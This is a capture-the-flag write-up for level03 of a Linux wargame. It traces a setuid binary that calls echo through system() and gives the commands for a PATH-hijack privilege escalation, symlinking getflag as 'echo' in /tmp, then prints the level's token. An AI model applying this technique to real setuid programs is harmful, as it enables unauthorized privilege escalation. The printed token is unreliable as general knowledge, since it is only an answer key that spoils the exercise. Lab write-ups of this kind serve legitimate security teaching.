# level03 solution
Given setuid binary in home directory with flag03 owner and level03 group owner:

    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

We can run it with ltrace to get the idea of what it is doing:

    getegid()                                        = 2003
    geteuid()                                        = 2003
    setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
    setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
    system("/usr/bin/env echo Exploit me"Exploit me

Ltrace is a tool which can display library calls of given binary. Provided setuid binary sets current effective user and group (flag03) to be a real user of current proccess and then it creates new process by calling system function and runs echo with environment provided from /usr/bin/env. But echo command in this binary executes by searching the PATH environment variable. This means that we can run any binary by providing our own PATH variable containing value of different directory. In this directory we can create symlink to getflag binary so setuid binary will run it under flag03 user.

    mkdir /tmp/level03
    cd /tmp/level03
    ln -s /bin/getflag echo
    cd -
    PATH=/tmp/level03 ./level03

As a result we get token for the next level bypassing logging as flag03 user.
    
    qi0maab88jeaj46qoumi7maus
